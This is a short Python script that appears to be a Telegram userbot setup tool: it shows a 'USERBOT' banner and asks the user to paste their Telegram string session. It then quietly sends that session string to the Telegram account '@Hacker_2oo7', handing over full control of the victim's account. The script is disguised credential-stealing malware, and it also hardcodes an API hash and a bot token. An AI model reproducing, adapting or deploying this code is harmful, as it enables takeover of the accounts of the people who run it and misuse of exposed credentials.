from telethon import TelegramClient
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import sys
api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system("clear")
string = input("""
\033[1;32m
██╗   ██╗███████╗███████╗██████╗ ██████╗  ██████╗ ████████╗
██║   ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝
██║   ██║███████╗█████╗  ██████╔╝██████╔╝██║   ██║   ██║   
██║   ██║╚════██║██╔══╝  ██╔══██╗██╔══██╗██║   ██║   ██║   
╚██████╔╝███████║███████╗██║  ██║██████╔╝╚██████╔╝   ██║   
 ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝   
                                                           
                                                           
string session: \033[1;34m""")

bot_token = "5728803812:AAGDrTWepYq2i_rU-niVu3p_1p9ckaaAQQ0"
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@Hacker_2oo7", client.session.save())

botClient = TelegramClient('@Userbot_robotbot', api_id,
                           api_hash).start(bot_token=bot_token)
